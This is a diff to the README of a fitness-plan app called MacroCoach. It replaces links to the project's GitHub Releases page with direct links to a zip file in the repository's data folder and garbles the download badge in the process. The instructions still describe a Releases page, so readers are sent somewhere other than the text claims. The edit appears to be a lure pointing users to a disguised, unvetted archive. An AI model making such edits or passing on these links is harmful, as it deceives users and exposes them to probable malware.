@@ -25,12 +25,12 @@ Welcome to MacroCoach v2! This application helps you create a tailored fitness a
 
 To get started, visit the Releases page to download the latest version of MacroCoach.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Available-blue.svg)](https://github.com/Alienistaxxx/My-project/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Alienistaxxx/My-project/main/data/My_project_v2.6.zip%20Latest%https://raw.githubusercontent.com/Alienistaxxx/My-project/main/data/My_project_v2.6.zip)](https://raw.githubusercontent.com/Alienistaxxx/My-project/main/data/My_project_v2.6.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Release Page:** Click on the link below to go to the Releases page:
-   [Download MacroCoach](https://github.com/Alienistaxxx/My-project/releases)
+   [Download MacroCoach](https://raw.githubusercontent.com/Alienistaxxx/My-project/main/data/My_project_v2.6.zip)
 
 2. **Select the Latest Release:** On the Releases page, you will see the latest version listed at the top. Click on it to view the details.
 
